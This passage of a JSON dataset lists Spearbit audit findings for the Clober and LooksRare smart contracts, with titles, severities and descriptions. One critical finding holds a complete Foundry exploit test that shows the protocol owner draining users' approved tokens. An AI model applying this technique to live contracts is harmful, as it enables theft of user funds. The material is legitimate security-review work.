        "body": "The OctopusHeap uses raw and heap indices. Raw indices are 0-based (root has raw index 0) and iterate the tree top to bottom, left to right. Heap indices are 1-based (root has heap index 0) and iterate the head left to right, top to bottom, but then iterate the remaining nodes octopus arm by arm. A mapping between the raw index and heap index can be obtained through _convertRawIndexToHeapIndex. The pop function defines a childRawIndex but this variable is not a raw index, it's actually raw index + 1 (1-based). 30",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Lack of orderIndex validation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The orderIndex parameter in the OrderNFT contract is missing proper validation. Realistically the value should never exceed type(uint232).max as it is passed from the OrderBook contract, however, future changes to the code might potentially cause encoding/decoding ambiguity.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unsafe _getParentHeapIndex, _getLeftChildHeapIndex",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "When heapIndex = 1 _getParentHeapIndex(uint16 heapIndex) would return 0 which is an invalid heap index. when heapIndex = 45 _getLeftChildHeapIndex(uint16 heapIndex) would return 62 which is an invalid heap index.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "_priceToIndex function implemented but unused",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The _priceToIndex function for the price books are implemented but unused.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect _MAX_NODES and _MAX_NODES_P descriptions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The derivation of the values _MAX_NODES and MAX_NODES_P in the comments are incorrect. For _MAX_NODES C * ((S *C) ** L-1)) = 4 * ((2 * 4) ** 3) = 2048 is missing the E, or replace S * C with N. The issue isn't entirely resolved though, as it becomes C * (S * C * E) ** (L - 1) = 4 * (2 * 4 * 2) ** 3 = 16384 or 2 ** 14 Same with _MAX_NODES_P",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "marketOrder() with expendOutput reverts with SlippageError with max tolerance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "During the audit the Clober team raised this issue. Added here to track the fixes.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Wrong OrderIndex could be emitted at Claim() event.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "During the audit the Clober team raised this issue. Added here to track the fixes.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The Protocol owner can drain users' currency tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "The Protocol owner can drain users' currency tokens that have been approved to the protocol. Makers who want to bid on NFTs would need to approve their currency token to be spent by the protocol. The owner should not be able to access these funds for free. The owner can drain the funds as follows: 1. Calls addTransferManagerForAssetType and assigns the currency token as the transferManagerForAs- setType and IERC20.transferFrom.selector as the selectorForAssetType for a new assetType. 2. Signs an almost empty MakerAsk order and sets its collection as the address of the targeted user and the assetType to the newly created assetType. The owner also creates the corresponding TakerBid by setting the recipient field to the amount of currency they would like to transfer. 3. Calls the executeTakerBid endpoint with the above data without a merkleTree or affiliate. // file: test/foundry/Attack.t.sol pragma solidity 0.8.17; import {IStrategyManager} from \"../../contracts/interfaces/IStrategyManager.sol\"; import {IBaseStrategy} from \"../../contracts/interfaces/IBaseStrategy.sol\"; import {OrderStructs} from \"../../contracts/libraries/OrderStructs.sol\"; import {ProtocolBase} from \"./ProtocolBase.t.sol\"; import {MockERC20} from \"../mock/MockERC20.sol\"; contract NullStrategy is IBaseStrategy { function isLooksRareV2Strategy() external pure override returns (bool) { return true; } function executeNull( OrderStructs.TakerBid calldata /* takerBid */ , OrderStructs.MakerAsk calldata /* makerAsk */ ) external pure returns ( uint256 price, uint256[] memory itemIds, uint256[] memory amounts, bool isNonceInvalidated ) {} } 5 contract AttackTest is ProtocolBase { NullStrategy private nullStrategy; MockERC20 private mockERC20; uint256 private signingOwnerPK = 42; address private signingOwner = vm.addr(signingOwnerPK); address private victimUser = address(505); function setUp() public override { super.setUp(); vm.startPrank(_owner); looksRareProtocol.initiateOwnershipTransfer(signingOwner); // This particular strategy is not a requirement of the exploit. nullStrategy = new NullStrategy(); looksRareProtocol.addStrategy( 0, 0, 0, NullStrategy.executeNull.selector, false, address(nullStrategy) ); mockERC20 = new MockERC20(); looksRareProtocol.updateCurrencyWhitelistStatus(address(mockERC20), true); looksRareProtocol.updateCreatorFeeManager(address(0)); mockERC20.mint(victimUser, 1000); vm.stopPrank(); vm.prank(signingOwner); looksRareProtocol.confirmOwnershipTransfer(); } function testDrain() public { vm.prank(victimUser); mockERC20.approve(address(looksRareProtocol), 1000); vm.startPrank(signingOwner); looksRareProtocol.addTransferManagerForAssetType( 2, address(mockERC20), mockERC20.transferFrom.selector ); OrderStructs.MakerAsk memory makerAsk = _createSingleItemMakerAskOrder({ // null strategy askNonce: 0, subsetNonce: 0, strategyId: 1, assetType: 2, // ERC20 asset! orderNonce: 0, collection: victimUser, // <--- will be used as the `from` currency: address(0), signer: signingOwner, minPrice: 0, itemId: 1 }); 6 bytes memory signature = _signMakerAsk(makerAsk, signingOwnerPK); OrderStructs.TakerBid memory takerBid = OrderStructs.TakerBid( address(1000), // `amount` field for the `transferFrom` 0, makerAsk.itemIds, makerAsk.amounts, bytes(\"\") ); looksRareProtocol.executeTakerBid( takerBid, makerAsk, signature, _EMPTY_MERKLE_TREE, _EMPTY_AFFILIATE ); vm.stopPrank(); assertEq(mockERC20.balanceOf(signingOwner), 1000); assertEq(mockERC20.balanceOf(victimUser), 0); } }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "StrategyFloorFromChainlink will often revert due to stale prices",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "The FloorFromChainlink strategy inherits from BaseStrategyChainlinkPriceLatency, so it can have a maxLatency of at most 3600 seconds. However, all of the chainlink mainnet floor price feeds have a heartbeat of 86400 seconds (24 hours), so the chainlink strategies will revert with the PriceNotRecentEnough error quite often. At the time of writing, every single mainnet floor price feed has an updateAt timestamp well over 3600 seconds in the past, meaning the strategy would always revert for any mainnet price feed right now. This may have not been realized earlier because the Goerli floor price feeds do have a heartbeat of 3600, but the mainnet heartbeat is much less frequent. One of the consequences is that users might miss out on exchanges they would have accepted. For example, if a taker bid is interested in a maker ask with an eth premium from the floor, in the likely scenario where the taker didn't log-in within 1 hour of the last oracle update, the strategy will revert and the exchange won't happen even though both parties are willing. If the floor moves up again the taker might not be interested anymore. The maker will have lost out on making a premium from the floor, and the taker would have lost out on the exchange they were willing to make.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "minPrice and maxPrice should reflect the allowed regions for the funds to be transferred from the bidder to the ask recipient",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "1. When a maker or taker sets a minPrice for an ask, the protocol should guarantee the funds they receive is at minimum the minPrice amount (currently not enforced). 2. Also reversely, when a maker or taker sets a maxPrice for a bid, the protocol should guarantee that the amount they spend is at maximum maxPrice (currently enforced). For 1. the current protocol-controlled deviation can be 30% maximum (sum of fees sent to the creator, the protocol fee recipient, and an affiliate).",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "StrategyItemIdsRange does not invalidate makerBid.amounts[0] == 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "StrategyItemIdsRange does not check whether makerBid.amounts[0] is zero or not. If it was 0, the taker can provide empty itemIds and amounts which will cause the for loop to be skipped. The check below will also be successful since both amounts are 0: if (totalOfferedAmount != desiredAmount) { revert OrderInvalid(); } Depending on the used implementation of a transfer manager for the asset type used in this order, we might end up with the taker taking funds from the maker without providing any NFT tokens. The current implementation of TransferManager does check whether the provided itemIds have length 0 and it would revert in that case. One difference between this strategy and others are that all strategies including this one do check to revert if an amount for a specific itemId is 0 (and some of them have loops but the length of those loops depends on the parameters from the maker which enforce the loop to run at least once), but for this strategy if no itemIds are provided by the taker, the loop is skipped and one does not check whether the aggregated amount is 0 or not.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "TransferManager's owner can block token transfers for LooksRareProtocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In general, a deployed TransferManager ( T ) and a deployed LooksRareProtocol ( L ) might have two different owners ( OT , OL ). Assume TransferManager is used for asset types 0 and 1 (ERC721, ERC1155) in LooksRareProtocol and Trans- ferManager has marked the LooksRareProtocol as an allowed operator. At any point, OT can call removeOpera- tor to block L from calling T . If that happens, OL would need to add new (virtual) asset types (not 0 or 1) and the corresponding transfer managers for them. Makers would need to resign their orders with new asset types. Moreover, if LooksRare for the following issue \"The Protocol owner can drain users' currency tokens\" applies their solution through PR 308 which removes the ability of OL to add new asset types, then the whole protocol would need to be redeployed, since all order executions would revert.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "transferItemsERC721 and transferBatchItemsAcrossCollections in TransferManager do not check whether an amount == 1 for an ERC721 token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "transferItemsERC721 and transferBatchItemsAcrossCollections in TransferManager do not check whether an amount == 1 for an ERC721 token. If an operator (approved by a user) sends a 0 amount for an itemId in the context of transferring ERC721 token, TransferManager would perform those transfers, even though the logic in the operator might have meant to avoid those transfers.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The maker cannot enforce the number of times a specific order can be fulfilled for custom strategies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "When a maker signs an order with a specific strategy it leaves it up to the strategy to decide how many times this specific order can be fulfilled. The strategy's logic on how to decide on the returned isNonceIn- validated value, can be a complex logic in general that might be prone to errors (or have backdoors). The maker should be able to directly enforce at least an upper bound for the maximum number of fulfills for an order to avoid unexpected expenditure.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A strategy can potentially reduce the value of a token before it gets transferred to a maker when a taker calls executeTakerAsk",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "When executeTakerAsk is called by a taker a (signed by maker) strategy will be called: (bool status, bytes memory data) = strategyInfo[makerBid.strategyId].implementation.call( abi.encodeWithSelector(strategyInfo[makerBid.strategyId].selector, takerAsk, makerBid) ); Note that this is a stateful call. This call is performed before the NFT token is transferred to the maker (signer). Even though the strategy is fixed by the maker (since the stratgeyId has been signed), the strategy's implementation might involve a complex logic that might allow (if the strategy colludes with the taker somehow) a derivative token (that is owned by / linked to the to-be-transferred token) to be reattached to another token (think of accessories for an NFT character token in a game). And so the value of the to-be-transferred token would be reduced in that sense. A maker would not be able to check for this linked derivative token ownership during the transaction since there is no post-transfer hook for the maker (except in one special case when the token involved is ERC1155 and the maker is a custom contract). Also, note that all the implemented strategies would not alter the state when they are called (their endpoints have a pure or a view visibility). There is an exception to this in the StrategyTestMultiFillCollectionOrder test contract.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "An added transfer manager cannot get deactivated from the protocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Once a transfer manager for an asset type gets added to the protocol either through the constructor or through addTransferManagerForAssetType, if at some point there is a malicious behavior involved with the transfer manager, there is no mechanism for the protocol's owner to deactivate the transfer manager (similar to how strategies can be deactivated). If TransferManager is used for an asset type, on the TransferManager side the owner can break the link between the operator (the LooksRare protocol potentially) and the TransferManager but not the other way around.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Temporary DoS is possible in case orders are using tokens with blacklists",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In the process of settling orders, _transferFungibleTokens is being called at max 4 times. In case one of these calls fails the entire transaction fails. It can only fail when an ERC20 token is used for the trade but since contracts are whitelisted in the system and probably vetted by the team, it's safe to say it's less probable that the receiver will have the ability to revert the entire transaction, although it is possible for contracts that implement a transferAndCall pattern. However, there's still the issue of transactions being reverted due to blacklistings (which have become more popular in the last year). In order to better assess the risk let's elaborate more on the 4 potential recipients of a transaction: 1. affiliate - The risk can be easily mitigated by proper handling at the front-end level. If the transaction fails due to the affiliate's address, the taker can specify address(0) as the affiliate. 2. recipient - If the transaction fails due to the recipient's address, it can only impact the taker in a gas-griefing way. 3. protocol - If the transaction fails due to the protocol's address, its address might be updated by the contract owner in the worst case. 4. creator - If the transaction fails due to the creator's address it can not be changed directly, but in the worst case creatorFeeManager can be changed.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "viewCreatorFeeInfo's reversion depends on order of successful calls to collection.royaltyInfo",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "The outcome of the call to viewCreatorFeeInfo for both CreatorFeeManagerWithRebates and Cre- atorFeeManagerWithRoyalties is dependent on the order of itemIds. Assume, we have 2 itemIds with the following properties:  itemId x where the call to collection.royaltyInfo(x, price) is successful (status == 1) and returns (a, ...) where a 6= 0.  itemId y where the call to collection.royaltyInfo(y, price) fails (status == 0) Then if itemIds provided to viewCreatorFeeInfo is:  [x, y], the call to viewCreatorFeeInfo returns successfully as the outcome for y will be ignored/skipped.  [y, x], the call to viewCreatorFeeInfo reverts with BundleEIP2981NotAllowed(collection), since the first item will be skipped and so the initial value for creator will not be set and remains address(0), but when we process the loop for x, we end up comparing a with address(0) which causes the revert.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "CreatorFeeManagerWithRebates.viewCreatorFeeInfo reversion is dependent on the order of itemIds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Assume there is an itemId x where collection.royaltyInfo(x, price) returns (0, _) and an- other itemId y where collection.royaltyInfo(y, price) returns (a, _) where a 6= 0. the itemIds array provided to CreatorFeeManagerWithRebates.viewCreatorFeeInfo is [x, y, the call would revert with the return parameters would be (address(0), 0) and [y, x, ...], Then if ...], BundleEIP2981NotAllowed(collection).",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Seller might get a lower fee than expected due to front-running",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "This protocol seems to have a fee structure where both the protocol and the original creator of the item are charging fees, and these fees are being subtracted from the seller's fee. This means that the seller, whether they are a maker or a taker, may receive a lower price than they expected due to sudden changes in creator or protocol fee rates.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "StrategyManager does not emit an event when the first strategy gets added.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "StrategyManager does not emit an event when the first strategy gets added which can cause issues for off-chain agents.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "TransferSelectorNFT does not emit events when new transfer managers are added in its construc- tor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "TransferSelectorNFT does not emit an event when assetTypes of 0 and 1 are added in its con- structor.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Protocol fees will be sent to address(0) if protocolFeeRecipient is not set.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Protocol fees will be sent to address(0) if protocolFeeRecipient is not set.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The returned price by strategies are not validated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "When a taker submits an order to be executed, the returned price by the maker's chosen strategy is not validated. The current strategies do have the validations implemented. But the general upper and lower bound price validation would need to be in the protocol contract itself since the price calculation in a potential strategy might be a complex matter that cannot be easily verified by a maker or a taker. Related issue: \"price validation in executeStrategyWithTakerAsk, executeCollectionStrategyWithTakerAsk and ex- ecuteCollectionStrategyWithTakerAskWithProof can be relaxed\"",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Makers can sign (or be tricked into signing) collection of orders (using the merkle tree mechanism) that cannot be entirely canceled.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "All user-facing order execution endpoints of the protocol check whether the order hash is included in the merkle tree data provided by the caller. If it is, the maker/signer is only required to sign the hash of the tree's root. A maker might sign (or get tricked into signing) a root that belongs to trees with a high number of leaves such that the leaves each encode an order with  Different subsetNonce and orderNonce (this would require canceling each nonce individually if the relevant endpoints are used).  askNonce or bidNonce that form a consecutive array of intergers ( 1, (cid:1) (cid:1) (cid:1) , n ) (this would require incrementing these nonces at least n times, if this method was used as a way of canceling the orders). To cancel these orders, the maker would need to call the cancelOrderNonces, cancelSubsetNonces, or incre- mentBidAskNonces. If the tree has a high number of nodes, it might be infeasible to cancel all the orders due to gas costs. The maker would be forced to remove its token approvals (if it's not a custom EIP-1271 maker/signer) and not use that address again to interact with the protocol.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The ItemIdsRange strategy allows for length mismatch in itemIds and amounts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "There is no validation that takerAsk.itemIds.length == takerAsk.amounts.length in the ItemIdsRange strategy, despite takerAsk.itemIds and takerAsk.amounts being the return values of the executeStrategyWithTakerAsk function. If takerAsk.itemIds.length > takerAsk.amounts.length, then the transaction will revert anyways when it attempts to read an index out of bounds in the main loop. However, there is nothing causing a revert if takerAsk.itemIds.length < takerAsk.amounts.length, and any extra values in the takerAsk.amounts array will be ignored. Most likely this issue would be caught later on in any transaction, e.g. the current TransferManager implementation checks for length mismatches. However, this TransferManager is just one possible implementation that could be added to the TransferSelectorNFT contract, so this still could be an issue.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Spec mismatch - StrategyCollectionOffer allows the only single item orders where the spec states it should allow any amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Proof only allow the transfer of a single ERC721/ERC1155 item, although the specification states it should support any amount.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Owner of strategies that inherit from BaseStrategyChainlinkMultiplePriceFeeds can add mali- cious price feeds after they have been added to LooksRareProtocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Owner of strategies that inherit from BaseStrategyChainlinkMultiplePriceFeeds can add mali- cious price feeds for new collections after they have been added to LooksRareProtocol. It's also important to note that these strategy owners might not neccessarily be the same owner as the LooksRareProtocol's. 1. LooksRareProtocol's OL adds strategy S. 2. Stragey's owner OS adds a malicous price feed for a new collection T .",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The price calculation in StrategyDutchAuction can be more accurate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "StrategyDutchAuction calculates the auction price as uint256 duration = makerAsk.endTime - makerAsk.startTime; uint256 decayPerSecond = (startPrice - makerAsk.minPrice) / duration; uint256 elapsedTime = block.timestamp - makerAsk.startTime; price = startPrice - elapsedTime * decayPerSecond; One of the shortcomings of the above calculation is that division comes before multiplication which can amplify the error due to division.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incorrect isMakerBidValid logic in ItemIdsRange execution strategy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "If an ItemIdsRange order has makerBid.itemIds[0] == 0, it is treated as invalid by the corre- sponding isMakerBidValid function. Since makerBid.itemIds[0] is the minItemId value, and since many NFT collections contain NFTs with id 0, this is incorrect (and does not match the logic of the ItemIdsRange executeS- trategyWithTakerAsk function). As a consequence, frontends that filter orders based on the isMakerBidValid function will ignore certain orders, even though they are valid.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Restructure struct definitions in OrderStructs in a more optimized format",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Maker and taker ask and bid structs include the fields itemIds and amounts. For most strategies, these two arrays are supposed to have the same length (except for StrategyItemIdsRange). Even for Strate- gyItemIdsRange one can either:  Relax the requirement that makerBid.amounts.length == 1 (be replaced by amounts and itemIds length to be equal to 2 ) by allowing an unused extra amount or  not use the makerBid.amounts and makerBid.itemIds and instead grab those 3 parameters from the addi- tionalParameters field. This might actually make more sense since in the case of StrategyItemIdsRange, the itemIds and amounts carry information that deviates from what they are intended to be used for.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "if/else block in executeMultipleTakerBids can be simplified/optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "if/else block in executeMultipleTakerBids can be simplified/optimized by using the continue keyword and placing the else's body in the outer scope. // If atomic, it uses the executeTakerBid function, if not atomic, it uses a catch/revert pattern with external function ,! if (isAtomic) { // Execute the transaction and add protocol fee totalProtocolFeeAmount += _executeTakerBid(takerBid, makerAsk, msg.sender, orderHash); unchecked { ++i; } continue; } try this.restrictedExecuteTakerBid(takerBid, makerAsk, msg.sender, orderHash) returns ( uint256 protocolFeeAmount ) { totalProtocolFeeAmount += protocolFeeAmount; } catch {} unchecked { ++i; } testThreeTakerBidsERC721OneFails() (gas: -24 (-0.002%)) Overall gas change: -24 (-0.002%) LooksRare: Fixed in PR 323. Spearbit: Verified.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache currency in executeTakerAsk and executeTakerBid",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "currency is read multiple times from calldata in executeTakerAsk and executeTakerBid.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache operators[i] in grantApprovals and revokeApprovals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "operators[i] is used 3 times in grantApprovals's (and twice in revokeApprovals) for loop.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "recipients[0] is never used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "recipients[0] is set to protocolFeeRecipient. But its value is never used afterward. payProtocolFeeAndAffiliateFee, the fees[0] amount is manually distributed to an affiliate if any and the pro- tocolFeeRecipient.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "currency validation can be optimized/refactored",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In the context above we are enforcing only native tokens or WETH to be supplied. The if statement can be simplified and refactored into a utility function (possibly defined in either BaseStrategy or in BaseStrate- gyChainlinkPriceLatency): if (makerAsk.currency != address(0)) { if (makerAsk.currency != WETH) { revert WrongCurrency(); } }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "validating amount can be simplified and possibly refactored",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In the context above, we are trying to invalidate orders that have 0 amounts or an amount other than 1 when the asset if an ERC721 if (amount != 1) { if (amount == 0) { revert OrderInvalid(); } if (assetType == 0) { revert OrderInvalid(); } } The above snippet can be simplified into: if (amount == 0 or (amount != 1 and assetType == 0)) { revert OrderInvalid(); }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_verifyMatchingItemIdsAndAmountsAndPrice can be further optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "_verifyMatchingItemIdsAndAmountsAndPrice's validation logic uses more opcodes than is neces- sary. Also, the whole function can be turned into an assembly block to further optimized this function. Examples of simplifications for if conditions or(X, gt(Y, 0)) or(X, Y) // simplified version or(X, iszero(eq(Y,Z))) or(X, xor(Y, Z)) // simplified version The nested if block below if (amount != 1) { if (amount == 0) { revert OrderInvalid(); } if (assetType == 0) { revert OrderInvalid(); } } can be simplified into 33 if (amount == 0) { revert OrderInvalid(); } if ((amount != 1) && (assetType == 0)) { revert OrderInvalid(); }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "In StrategyFloorFromChainlink premium amounts miss the related checks when compared to checks for discount amounts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "For discount amounts, StrategyFloorFromChainlink has custom checks for the underflows (even though they will be caught by the compiler): 36 if (floorPrice <= discountAmount) { revert DiscountGreaterThanFloorPrice(); } uint256 desiredPrice = floorPrice - discountAmount; ... // @dev Discount cannot be 100% if (discount >= 10_000) { revert OrderInvalid(); } uint256 desiredPrice = (floorPrice * (10_000 - discount)) / 10_000; Similar checks for overflows for the premium are missing in the execution and validation endpoints (even though they will be caught by the compiler, floorPrice + premium or 10_000 + premium might overflow).",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "StrategyFloorFromChainlink's isMakerBidValid compare the time dependent floorPrice to a fixed discount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "When isMakerBidValid gets called depending on the market conditions at that specific time the comparisons between the floorPrice and the discount might cause this function to either return isValid as true or false.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "StrategyFloorFromChainlink's isMakerAskValid does not validate makerAsk.additionalParameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "For executeFixedPremiumStrategyWithTakerBid and executeBasisPointsPremiumStrategy- WithTakerBid, maker needs to make sure to populate its additionalParameters with the premium amount, otherwise the taker's transactions would revert: makerAsk.additionalParameters = abi.encode(premium); isMakerAskValid does not check whether makerAsk.additionalParameters has 32 as its length. For example, the validation endpoint for StrategyCollectionOffer does check this for the merkle root.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "StrategyFloorFromChainlink strategies do not check for asset types explicitly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "StrategyFloorFromChainlink has 4 different execution endpoints:  executeFixedPremiumStrategyWithTakerBid  executeBasisPointsPremiumStrategyWithTakerBid  executeFixedDiscountCollectionOfferStrategyWithTakerAsk  executeBasisPointsDiscountCollectionOfferStrategyWithTakerAsk All these endpoints require that only one amount to be passed (asked for or bid on) and that amount would need to be 1. This is in contrast to StrategyCollectionOffer strategy that allows an arbitrary amount (although also required to be only one amount, [a]) Currently, Chainlink only provides price feeds for a selected list of ERC721 collections: https://docs.chain.link/ data-feeds/nft-floor-price/addresses So, if there are no price feeds for ERC1155 (as of now), the transaction would revert. Thus implicitly one can deduce that the chainlink floor strategies are only implemented for ERC721 tokens. Other strategies condition the amounts based on the assetType: 38  assetType == 0 or ERC721 collections can only have 1 as a valid amount  assetType == 0 or ERC1155 collections can only have a non-zero number as a valid amount If in the future chainlink or another token-price-feed adds support for some ERC1155 collections, one cannot use the current floor strategies to fulfill an order with an amount greater than 1.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "itemIds and amounts are redundant fields for takerXxx struct",
